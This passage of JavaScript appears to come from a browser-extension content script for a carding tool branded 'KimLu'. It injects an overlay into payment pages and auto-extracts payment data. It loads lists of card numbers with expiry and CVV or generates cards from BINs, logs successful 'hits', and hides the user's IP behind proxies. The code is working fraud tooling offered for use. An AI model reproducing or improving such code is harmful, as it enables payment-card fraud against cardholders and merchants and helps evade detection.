      if (changes[K.PROXY_STRING] !== undefined) {
        localStorage.setItem(K.PROXY_STRING, changes[K.PROXY_STRING]);
      }
      if (changes[K.PROXY_INFO] !== undefined) {
        localStorage.setItem(K.PROXY_INFO, typeof changes[K.PROXY_INFO] === 'object' ? JSON.stringify(changes[K.PROXY_INFO]) : changes[K.PROXY_INFO]);
      }

      // Sync music (name only -- MUSIC_DATA stays in chrome.storage, too large for localStorage)
      if (changes[K.MUSIC_NAME] !== undefined) {
        localStorage.setItem(K.MUSIC_NAME, changes[K.MUSIC_NAME]);
      }

      // Sync card history
      if (changes[K.CARD_HISTORY] !== undefined) {
        let hist = changes[K.CARD_HISTORY];
        if (typeof hist === 'string') try { hist = JSON.parse(hist); } catch (e) { hist = []; }
        if (Array.isArray(hist)) localStorage.setItem(K.CARD_HISTORY, JSON.stringify(hist));
      }

      // Sync last seen BIN time
      if (changes[K.LAST_SEEN_BIN_TIME] !== undefined) {
        localStorage.setItem(K.LAST_SEEN_BIN_TIME, changes[K.LAST_SEEN_BIN_TIME]);
      }
    }
  });

  // ============= REBUILD BIN LIST UI AFTER CROSS-TAB SYNC =============
  function rebuildBinListUI() {
    const binListContainer = document.getElementById('binListContainer');
    if (!binListContainer) return;

    // Clear existing entries
    binListContainer.innerHTML = '';

    savedBINs.forEach((bin, i) => {
      const row = document.createElement('div');
      row.className = 'bin-row';
      row.style.cssText = 'display:flex;gap:6px;margin-bottom:4px;align-items:center;';

      const input = document.createElement('input');
      input.type = 'text';
      input.className = 'bin-input';
      input.value = bin;
      input.maxLength = 8;
      input.placeholder = 'Enter BIN';
      input.dataset.index = i;
      input.addEventListener('input', () => {
        savedBINs[i] = input.value.replace(/\D/g, '');
      });

      if (i === 0) {
        const addBtn = document.createElement('button');
        addBtn.className = 'bin-add-btn';
        addBtn.textContent = '+';
        addBtn.addEventListener('click', () => {
          savedBINs.push('');
          rebuildBinListUI();
        });
        row.appendChild(input);
        row.appendChild(addBtn);
      } else {
        const removeBtn = document.createElement('button');
        removeBtn.className = 'bin-remove-btn';
        removeBtn.textContent = '-';
        removeBtn.addEventListener('click', () => {
          savedBINs.splice(i, 1);
          saveBINs(savedBINs);
          rebuildBinListUI();
        });
        row.appendChild(input);
        row.appendChild(removeBtn);
      }

      binListContainer.appendChild(row);
    });

    // Ensure at least one empty row
    if (savedBINs.length === 0) {
      savedBINs.push('');
      rebuildBinListUI();
    }
  }

  window.addEventListener("message", (event) => {
    if (event.data && event.data.type === "EXTENSION_INVALIDATED") {
      setTimeout(() => {
        window.postMessage({ type: "GET_LOGIN_STATE" }, "*")
      }, 2000)
    }
  })
  let musicPlayer = null
  function toggleMusic() {
    const musicBtn = document.getElementById("musicToggleBtn")
    if (isMusicPlaying) {
      stopMusic()
      if (musicBtn) musicBtn.textContent = "🎵"
      isMusicPlaying = false
    } else {
      const success = playMusicMp3()
      if (success) {
        if (musicBtn) musicBtn.textContent = "🎶"
        isMusicPlaying = true
      }
    }
  }
  function stopMusic() {
    window.postMessage({ type: "STOP_BACKGROUND_MUSIC" }, "*")
    if (musicPlayer) {
      try {
        musicPlayer.pause()
        musicPlayer.currentTime = 0
        if (musicPlayer.parentNode) {
          musicPlayer.parentNode.removeChild(musicPlayer)
        }
      } catch (e) { }
      musicPlayer = null
    }
    const audioPlayer = document.getElementById("kimtimAudioPlayer")
    if (audioPlayer) {
      try {
        audioPlayer.pause()
        audioPlayer.remove()
      } catch (e) { }
    }
    isMusicPlaying = false
  }
  function playMusicMp3() {
    stopMusic()

    const hasCustomMusic = localStorage.getItem(K.MUSIC_NAME)
    if (hasCustomMusic) {
      window.postMessage({ type: "PLAY_BACKGROUND_MUSIC", volume: soundVolume }, "*")
      isMusicPlaying = true
      const musicBtn = document.getElementById("musicToggleBtn")
      if (musicBtn) musicBtn.textContent = "🎶"
      showWarning("👀 Custom music playing", "success")
      return true
    }

    window.postMessage({ type: "GET_MUSIC_URL" }, "*")
    return true
  }
  window.addEventListener("message", (event) => {
    if (event.source !== window) return
    if (event.data.type === "MUSIC_URL") {
      const musicUrl = event.data.url
      try {
        musicPlayer = new Audio(musicUrl)
        musicPlayer.loop = true
        musicPlayer.volume = soundVolume
        musicPlayer.onloadeddata = () => {
          musicPlayer
            .play()
            .then(() => {
              isMusicPlaying = true
              const musicBtn = document.getElementById("musicToggleBtn")
              if (musicBtn) musicBtn.textContent = "🎶"
              showWarning("👀 Music playing", "success")
            })
            .catch((err) => {
              showWarning("Tap 🎵 again", "info")
            })
        }
        musicPlayer.onerror = (e) => {
          showWarning("⚠️ Music not available", "error")
        }
      } catch (e) {
        showWarning("⚠️ Cannot play music", "error")
      }
    }
  })
  function setMode(mode) {
    currentMode = mode
    document.querySelectorAll(".mode-btn").forEach((btn) => {
      btn.classList.toggle("active", btn.dataset.mode === mode)
    })
    const binSection = document.getElementById("binSection")
    const ccSection = document.getElementById("ccSection")
    if (mode === "bin") {
      binSection?.classList.remove("hidden")
      ccSection?.classList.add("hidden")
    } else {
      binSection?.classList.add("hidden")
      ccSection?.classList.remove("hidden")
    }
  }
  function updateCcCount() {
    const ccTextarea = document.getElementById("ccTextarea")
    const ccCount = document.getElementById("ccCount")
    if (!ccTextarea || !ccCount) return
    const lines = ccTextarea.value.split("\n").filter((line) => line.trim() && line.includes("|"))
    ccCount.textContent = Math.min(lines.length, 20)
  }
  function saveCcListFunc() {
    const ccTextarea = document.getElementById("ccTextarea")
    if (!ccTextarea) return
    const lines = ccTextarea.value
      .split("\n")
      .map((line) => line.trim())
      .filter((line) => {
        const parts = line.split("|")
        return parts.length === 4 && parts[0].length >= 13
      })
      .slice(0, 20)
    ccList = lines
    currentCCIndex = 0
    const ccInfo = document.querySelector(".cc-info")
    if (ccInfo) ccInfo.textContent = `${ccList.length} cards loaded`
    const modal = document.getElementById("ccModal")
    modal.classList.remove("show")
    setTimeout(() => modal.classList.add("hidden"), 400)
    showWarning(`✅ ${ccList.length} cards saved`, "success")
  }
  function getNextCC() {
    if (ccList.length === 0 || currentCCIndex >= ccList.length) {
      return null
    }
    const cc = ccList[currentCCIndex]
    currentCCIndex++
    const parts = cc.split("|")
    return {
      number: parts[0],
      month: parts[1],
      year: parts[2],
      cvv: parts[3],
    }
  }
  function toggleCollapsible(contentId, header) {
    const content = document.getElementById(contentId)
    const icon = header.querySelector(".collapse-icon")
    if (content.classList.contains("open")) {
      content.classList.remove("open")
      icon.textContent = "▼"
    } else {
      content.classList.add("open")
      icon.textContent = "▲"
    }
  }
  function addToHistory(card, mm, yy, cvv, response) {
    const entry = {
      card: `${card}|${mm}|${yy}|${cvv}`,
      response: response,
      time: new Date().toLocaleTimeString(),
    }
    cardHistory.unshift(entry)
    if (cardHistory.length > 50) cardHistory.pop()
    saveCardHistory()
    updateHistoryDisplay()
    updateStats()
  }
  function updateHistoryDisplay() {
    const historyList = document.getElementById("historyList")
    if (!historyList) return
    if (cardHistory.length === 0) {
      historyList.innerHTML = '<div class="history-empty">No logs yet</div>'
      return
    }
    const logsToShow = cardHistory.slice(0, 50)
    historyList.innerHTML = logsToShow
      .map(
        (entry, index) => `
    <div class="history-item ${entry.response === "SUCCESS" ? "success" : "error"}">
      <div class="history-main">
        <div class="history-card-line">
          <span class="history-card">${entry.card}</span>
          <button class="history-copy" data-card="${entry.card}" data-index="${index}">📋</button>
        </div>
        <div class="history-response">${entry.response}</div>
      </div>
    </div>
  `,
      )
      .join("")
    historyList.querySelectorAll(".history-copy").forEach((btn) => {
      btn.addEventListener("click", function () {
        const card = this.getAttribute("data-card")
        if (card) {
          navigator.clipboard
            .writeText(card)
            .then(() => {
              this.textContent = "✓"
              setTimeout(() => {
                this.textContent = "📋"
              }, 1000)
            })
            .catch(() => {
              window.postMessage({ type: "COPY_TO_CLIPBOARD_TEXT", text: card }, "*")
              this.textContent = "✓"
              setTimeout(() => {
                this.textContent = "📋"
              }, 1000)
            })
        }
      })
    })
  }
  function updateStats(serverAttempts, serverHits) {
    const attemptsEl = document.getElementById("statAttempts")
    const successEl = document.getElementById("statSuccess")
    const attempts = serverAttempts !== undefined ? serverAttempts : attemptCount
    const hits = serverHits !== undefined ? serverHits : cardHistory.filter((h) => h.response === "SUCCESS").length
    if (attemptsEl) attemptsEl.textContent = attempts
    if (successEl) successEl.textContent = hits
  }
  window.addEventListener("message", (event) => {
    if (event.source !== window) return
    switch (event.data.type) {
      case "UPDATE_SAVED_BIN":
        if (event.data.bin) {
          if (savedBINs.length === 0) {
            savedBINs = [event.data.bin]
          }
          const binInput = document.getElementById("binInput1")
          if (binInput && !binInput.value) {
            binInput.value = event.data.bin
          }
          updateBinStatus()
        }
        break
      case "UPDATE_SAVED_ID":
        if (event.data.id) {
          savedId = event.data.id
          updateIdStatus()
        }
        break
      case "UPDATE_TOGGLE_STATES":
        break
      case "UPDATE_LOGIN_STATE":
        if (event.data.userId && !isLoggedIn) {
          userId = event.data.userId || ""
          userFirstName = event.data.firstName || ""
          isLoggedIn = true
          if (userId) localStorage.setItem(K.USER_ID, userId)
          if (userFirstName) localStorage.setItem(K.FIRST_NAME, userFirstName)
          const loginScreen = document.getElementById("loginScreen")
          const dashboard = document.getElementById("mainDashboard")
          if (loginScreen) loginScreen.classList.add("hidden")
          if (dashboard) dashboard.classList.remove("hidden")
          updateIpBarUserInfo()
          startHitCountsRefresh()
        }
        break
      case "PROXY_CLEARED_FROM_POPUP":
        proxyString = ""
        localStorage.removeItem(K.PROXY_STRING)
        localStorage.removeItem(K.PROXY_ENABLED)
        const proxyBtn = document.getElementById("proxyViewBtn")
        if (proxyBtn) {
          proxyBtn.textContent = "Set"
        }
        showWarning("Proxy cleared", "info")
        break
    }
  })
  function createPageWatermark() {
    if (document.getElementById("kimtim-page-watermark")) return
    const watermark = document.createElement("div")
    watermark.id = "kimtim-page-watermark"
    watermark.className = "kimtim-page-watermark"
    watermark.innerHTML = `
    <div class="kimtim-wm-line"></div>
    <span>K</span>
    <span>I</span>
    <span>M</span>
    <span>L</span>
    <span>U</span>
    <div class="kimtim-wm-line"></div>
  `
    document.body.appendChild(watermark)
  }

  function createKimLuDashboard() {
    if (document.getElementById('kimtim-bottom-stats-bar')) return;

    const bar = document.createElement('div');
    bar.id = 'kimtim-bottom-stats-bar';
    bar.className = 'kimtim-bottom-stats-bar';

    // Header with Logo and KimLu
    const header = document.createElement('div');
    header.className = 'stats-header';

    const avatar = document.createElement('div');
    avatar.className = 'stats-avatar';
    const img = document.createElement('img');
    img.src = DEFAULT_PFP || "";
    avatar.appendChild(img);

    const userInfo = document.createElement('div');
    userInfo.className = 'stats-user-info';
    const username = document.createElement('div');
    username.className = 'stats-username';
    username.textContent = 'KimLu';

    const hitInfo = document.createElement('div');
    hitInfo.className = 'stats-hit-info';
    hitInfo.innerHTML = `HIT: <span id="bar-personal-hits">${userHitsCount}</span> | GLOBAL: <span id="bar-global-hits">${globalHitsCount}</span>`;

    userInfo.appendChild(username);
    userInfo.appendChild(hitInfo);
    header.appendChild(avatar);
    header.appendChild(userInfo);

    const divider = document.createElement('div');
    divider.className = 'stats-divider';

    const ipRow = document.createElement('div');
    ipRow.className = 'stats-ip-row';
    const ipDot = document.createElement('div');
    ipDot.className = 'stats-ip-dot status-inactive';
    ipDot.id = 'bar-ip-dot';
    const ipLabel = document.createElement('div');
    ipLabel.className = 'stats-ip-label';
    ipLabel.textContent = 'IP:';
    const ipValue = document.createElement('div');
    ipValue.className = 'stats-ip-value';
    ipValue.id = 'bar-ip-value';
    ipValue.dataset.revealed = 'false';
    ipValue.style.cursor = 'pointer';
    ipValue.title = 'Tap to reveal IP';
    ipValue.textContent = currentDisplayIp ? '***.***.***.***' : 'Checking...';
    const onToggleIp = (e) => {
      e.stopPropagation();
      const isRevealed = ipValue.dataset.revealed === 'true';
      ipValue.dataset.revealed = isRevealed ? 'false' : 'true';
      updateKimLuDashboard();
    };
    ipValue.addEventListener('pointerup', onToggleIp);

    ipRow.appendChild(ipDot);
    ipRow.appendChild(ipLabel);
    ipRow.appendChild(ipValue);

    bar.appendChild(header);
    bar.appendChild(divider);
    bar.appendChild(ipRow);

    document.documentElement.appendChild(bar);

    // Toggle minimize on click
    bar.addEventListener('click', () => {
      bar.classList.toggle('minimized');
    });

    if (!currentDisplayIp) {
      fetchRealIp();
    }
  }

  function updateKimLuDashboard() {
    const pEl = document.getElementById('bar-personal-hits');
    const gEl = document.getElementById('bar-global-hits');
    const ipEl = document.getElementById('bar-ip-value');
    const dotEl = document.getElementById('bar-ip-dot');
    const nameEl = document.querySelector('.stats-username');

    if (pEl) pEl.textContent = userHitsCount;
    if (gEl) gEl.textContent = globalHitsCount;
    if (ipEl) {
      const isRevealed = ipEl.dataset.revealed === 'true';
      if (isRevealed) {
        ipEl.textContent = currentDisplayIp || 'Checking...';
        ipEl.classList.add('is-revealed');
        ipEl.title = 'Tap to hide IP';
      } else {
        ipEl.textContent = currentDisplayIp ? '***.***.***.***' : 'Checking...';
        ipEl.classList.remove('is-revealed');
        ipEl.title = 'Tap to reveal IP';
      }
    }
    if (nameEl && isLoggedIn && userFirstName) nameEl.textContent = userFirstName;

    if (dotEl) {
      dotEl.className = proxyEnabled ? 'stats-ip-dot status-active' : 'stats-ip-dot status-inactive';
    }
  }

  function drawPfpOnCanvas(url, canvas, fallback) {
    if (!url || url === DEFAULT_PFP) {
      canvas.style.display = "none";
      fallback.style.display = "flex";
      return;
    }
    sendToBackground({ type: "FETCH_IMAGE", url: url }).then(result => {
      if (!result || !result.success || !result.dataUrl) {
        canvas.style.display = "none";
        fallback.style.display = "flex";
        return;
      }
      const byteString = atob(result.dataUrl.split(',')[1]);
      const mimeType = result.dataUrl.split(',')[0].split(':')[1].split(';')[0];
      const ab = new ArrayBuffer(byteString.length);
      const ia = new Uint8Array(ab);
      for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
      const blob = new Blob([ab], { type: mimeType });
      createImageBitmap(blob).then(bitmap => {
        const ctx = canvas.getContext("2d");
        const size = canvas.width;
        ctx.clearRect(0, 0, size, size);
        ctx.beginPath();
        ctx.arc(size / 2, size / 2, size / 2, 0, Math.PI * 2);
        ctx.closePath();
        ctx.clip();
        ctx.drawImage(bitmap, 0, 0, size, size);
        canvas.style.display = "block";
        fallback.style.display = "none";
      }).catch(() => {
        canvas.style.display = "none";
        fallback.style.display = "flex";
      });
    }).catch(() => {
      canvas.style.display = "none";
      fallback.style.display = "flex";
    });
  }

  let currentDisplayIp = "";
  let isIpBlurred = true;
  let ipRevealTimeout = null;

  function createBottomIpBar() {
    if (document.getElementById("kimtim-bottom-ip-bar")) return;

    const showUser = isLoggedIn && userFirstName;
    const pfp = userPfpUrl || DEFAULT_PFP;
    const name = userFirstName || "User";
    const initials = name.slice(0, 2).toUpperCase();

    const ipBar = document.createElement("div");
    ipBar.id = "kimtim-bottom-ip-bar";
    ipBar.className = "kimtim-bottom-ip-bar";
    if (!isLoggedIn) ipBar.style.display = "none";

    // User section
    const userSection = document.createElement("div");
    userSection.className = "ipbar-user-section";
    userSection.id = "ipBarUserSection";
    if (!showUser) userSection.style.display = "none";

    const pfpWrap = document.createElement("div");
    pfpWrap.className = "ipbar-pfp-wrap";

    const pfpCanvas = document.createElement("canvas");
    pfpCanvas.id = "ipBarPfpCanvas";
    pfpCanvas.width = 72;
    pfpCanvas.height = 72;
    pfpCanvas.className = "ipbar-pfp-canvas";

    const pfpFallback = document.createElement("div");
    pfpFallback.className = "ipbar-pfp-fallback";
    pfpFallback.id = "ipBarPfpFallback";
    pfpFallback.textContent = initials;

    pfpWrap.appendChild(pfpCanvas);
    pfpWrap.appendChild(pfpFallback);

    if (showUser && pfp && pfp !== DEFAULT_PFP) {
      drawPfpOnCanvas(pfp, pfpCanvas, pfpFallback);
    } else {
      pfpCanvas.style.display = "none";
    }

    const userMeta = document.createElement("div");
    userMeta.className = "ipbar-user-meta";

    const usernameSpan = document.createElement("span");
    usernameSpan.className = "ipbar-username";
    usernameSpan.id = "ipBarUsername";
    usernameSpan.textContent = name;

    const statsSpan = document.createElement("span");
    statsSpan.className = "ipbar-stats";

    const globalLabel = document.createElement("span");
    globalLabel.className = "ipbar-stat-label";
    globalLabel.textContent = "GLOBAL:";
    const globalVal = document.createElement("span");
    globalVal.className = "ipbar-stat-val";
    globalVal.id = "ipBarGlobalHits";
    globalVal.textContent = globalHitsCount;
    const sep = document.createElement("span");
    sep.className = "ipbar-stat-sep";
    sep.textContent = "|";
    const hitLabel = document.createElement("span");
    hitLabel.className = "ipbar-stat-label";
    hitLabel.textContent = "HIT:";
    const hitVal = document.createElement("span");
    hitVal.className = "ipbar-stat-val";
    hitVal.id = "ipBarHits";
    hitVal.textContent = userHitsCount;

    statsSpan.appendChild(hitLabel);
    statsSpan.appendChild(document.createTextNode(" "));
    statsSpan.appendChild(hitVal);
    statsSpan.appendChild(document.createTextNode(" "));
    statsSpan.appendChild(sep);
    statsSpan.appendChild(document.createTextNode(" "));
    statsSpan.appendChild(globalLabel);
    statsSpan.appendChild(document.createTextNode(" "));
    statsSpan.appendChild(globalVal);

    userMeta.appendChild(usernameSpan);
    userMeta.appendChild(statsSpan);

    userSection.appendChild(pfpWrap);
    userSection.appendChild(userMeta);

    // Divider
    const divider = document.createElement("div");
    divider.className = "ipbar-divider";
    divider.id = "ipBarDivider";
    if (!showUser) divider.style.display = "none";

    // IP section
    const ipSection = document.createElement("div");
    ipSection.className = "ipbar-ip-section ip-row-clickable";
    ipSection.id = "ipBarIpRow";

    const dot = document.createElement("span");
    dot.className = "ipbar-status-dot status-inactive";
    dot.id = "ipBarProxyDot";

    const ipLabel = document.createElement("span");
    ipLabel.className = "ipbar-ip-label";
    ipLabel.textContent = "IP:";

    const ipValue = document.createElement("span");
    ipValue.className = "ipbar-ip-value ip-blurred";
    ipValue.id = "ipBarIpValue";
    ipValue.textContent = "Loading...";

    ipSection.appendChild(dot);
    ipSection.appendChild(ipLabel);
    ipSection.appendChild(ipValue);

    ipBar.appendChild(userSection);
    ipBar.appendChild(divider);
    ipBar.appendChild(ipSection);

    document.body.appendChild(ipBar);

    ipSection.addEventListener("click", toggleIpReveal);
  }

  function updateIpBarUserInfo() {
    const ipBarEl = document.getElementById("kimtim-bottom-ip-bar");
    const userSection = document.getElementById("ipBarUserSection");
    const divider = document.getElementById("ipBarDivider");
    const pfpCanvas = document.getElementById("ipBarPfpCanvas");
    const pfpFallback = document.getElementById("ipBarPfpFallback");
    const nameEl = document.getElementById("ipBarUsername");
    const hitsEl = document.getElementById("ipBarHits");
    const globalHitsEl = document.getElementById("ipBarGlobalHits");

    if (!isLoggedIn) {
      if (ipBarEl) ipBarEl.style.display = "none";
      return;
    }

    if (ipBarEl) ipBarEl.style.display = "flex";
    if (userSection) userSection.style.display = "flex";
    if (divider) divider.style.display = "block";

    const pfp = userPfpUrl || DEFAULT_PFP;
    const name = userFirstName || "User";
    const initials = name.slice(0, 2).toUpperCase();

    if (pfpFallback) pfpFallback.textContent = initials;
    if (pfpCanvas && pfp && pfp !== DEFAULT_PFP) {
      pfpCanvas.style.display = "";
      drawPfpOnCanvas(pfp, pfpCanvas, pfpFallback);
    } else if (pfpCanvas) {
      pfpCanvas.style.display = "none";
      if (pfpFallback) pfpFallback.style.display = "flex";
    }
    if (nameEl) nameEl.textContent = name;
    if (hitsEl) hitsEl.textContent = userHitsCount;
    if (globalHitsEl) globalHitsEl.textContent = globalHitsCount;
    updateKimLuDashboard();
  }

  function toggleIpReveal() {
    const ipValue = document.getElementById("ipBarIpValue");
    if (!ipValue) return;

    if (ipRevealTimeout) {
      clearTimeout(ipRevealTimeout);
      ipRevealTimeout = null;
    }

    if (isIpBlurred) {
      ipValue.classList.remove("ip-blurred");
      ipValue.classList.add("ip-revealed");
      isIpBlurred = false;

      ipRevealTimeout = setTimeout(() => {
        ipValue.classList.remove("ip-revealed");
        ipValue.classList.add("ip-blurred");
        isIpBlurred = true;
      }, 5000);
    } else {
      ipValue.classList.remove("ip-revealed");
      ipValue.classList.add("ip-blurred");
      isIpBlurred = true;
    }
  }

  async function fetchRealIp() {
    try {
      const response = await sendToBackground({ type: "FETCH_REAL_IP" });
      if (response && response.ip) {
        currentDisplayIp = response.ip;
        updateBottomIpBar(response.ip, false);
      }
    } catch (e) {
    }
  }

  function updateBottomIpBar(ip, isProxyActive) {
    const proxyDot = document.getElementById("ipBarProxyDot");
    const ipValue = document.getElementById("ipBarIpValue");

    if (proxyDot) {
      proxyDot.className = isProxyActive
        ? "ipbar-status-dot status-active"
        : "ipbar-status-dot status-inactive";
    }

    if (ipValue && ip) {
      currentDisplayIp = ip;
      ipValue.textContent = ip;
      ipValue.className = isIpBlurred ? "ipbar-ip-value ip-blurred" : "ipbar-ip-value ip-revealed";
    }

    updateIpBarUserInfo();
    updateKimLuDashboard();
  }

  ; (function initOnce() {
    if (window.__kimtimOverlayInit) return
    window.__kimtimOverlayInit = true
    if (window !== window.top) return
    function tryCreateOverlay() {
      if (document.body) {
        waitForPaymentPage(async (isPayment) => {
          if (isPayment) {
            isDashboardActive = true
            await createOverlay()
            createPageWatermark()
            createKimLuDashboard()

            if (licenseValid && !isVersionOutdated) {
              createBottomIpBar()
              updateIpBarUserInfo()
            }
            autoExtractPaymentFromUrl()
            applyCustomStyles()

            if (licenseValid && !isVersionOutdated) {
              autoLoadAndVerifyProxy()

              fetchBinLibrary().then(async () => {

                await checkNewBinNotification();

                if (extractedPaymentData.businessUrl) {
                  checkBinRecommendation(extractedPaymentData.businessUrl);
                }
              });
            }
          }
        }, 10)
      } else {
        setTimeout(tryCreateOverlay, 50)
      }
    }
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", tryCreateOverlay, { once: true })
    } else {
      tryCreateOverlay()
    }
  })()
}



